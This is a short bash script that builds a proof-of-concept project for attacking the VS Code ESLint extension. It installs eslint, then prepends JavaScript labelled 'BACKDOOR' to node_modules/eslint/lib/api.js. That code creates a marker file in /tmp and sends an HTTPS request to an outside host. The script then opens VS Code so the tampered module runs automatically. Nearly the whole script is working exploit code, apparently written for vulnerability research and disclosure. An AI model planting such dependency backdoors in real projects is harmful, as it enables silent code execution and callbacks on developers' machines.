#!/bin/bash

# Strict mode:
set -euo pipefail
IFS=$'\n\t'


# Make the project
mkdir vscode-eslint-poc-gen
cd vscode-eslint-poc-gen
npm init --yes
# Install eslint globally to bootstrap and accept all defaults
npm install -g eslint
(yes '' | eslint --init) || echo ''
# And uninstall the global eslint
npm uninstall -g eslint
# Create a js file
echo 'window.foo = bar' > index.js
# Backdoor eslint
BACKDOOR="const fs = require('fs');const filename = '/tmp/hifromvscode-eslint';fs.closeSync(fs.openSync(filename, 'w'));const https = require('https');https.get('https://daviddworken.com/hifromvscode-eslint')" 
BACKDOORED_FILE='node_modules/eslint/lib/api.js'
{ echo $BACKDOOR; cat $BACKDOORED_FILE; } > tmp && mv tmp $BACKDOORED_FILE
# And start vscode
echo 'Created backdoored project, opening VS code!'
code index.js

